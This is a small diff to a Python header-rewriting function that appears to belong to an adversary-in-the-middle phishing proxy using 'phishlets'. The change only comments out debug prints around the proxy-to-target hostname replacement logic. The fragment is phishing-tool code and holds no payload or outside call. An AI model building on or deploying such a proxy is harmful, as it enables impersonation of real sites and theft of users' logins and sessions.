@@ -122,11 +122,11 @@ def patch_headers_out(headers, proxy_host, target_host, phishlet_data=None):
             
             replacement_map[proxy_hostname] = original_hostname
             
-        print(f"\n ---- replacement_map: {replacement_map}")
+        # print(f"\n ---- replacement_map: {replacement_map}")
         
         # Sort by length (longest first) to ensure specific subdomains are processed before base domains
         sorted_replacements = sorted(replacement_map.items(), key=lambda x: len(x[0]), reverse=True)
-        print(f"Sorted replacements: {sorted_replacements}")
+        # print(f"Sorted replacements: {sorted_replacements}")
         
         # Apply replacements to headers
         for key, value in headers_dict.items():
@@ -207,7 +207,7 @@ def patch_headers_out(headers, proxy_host, target_host, phishlet_data=None):
                         new_values.append(v)
                 headers_dict[key] = new_values
     
-    print(f"phishlet_data_for_headers: {phishlet_data} \n")
+    # print(f"phishlet_data_for_headers: {phishlet_data} \n")
     
     # Check if phishlet_data exists before accessing its properties
     if phishlet_data:
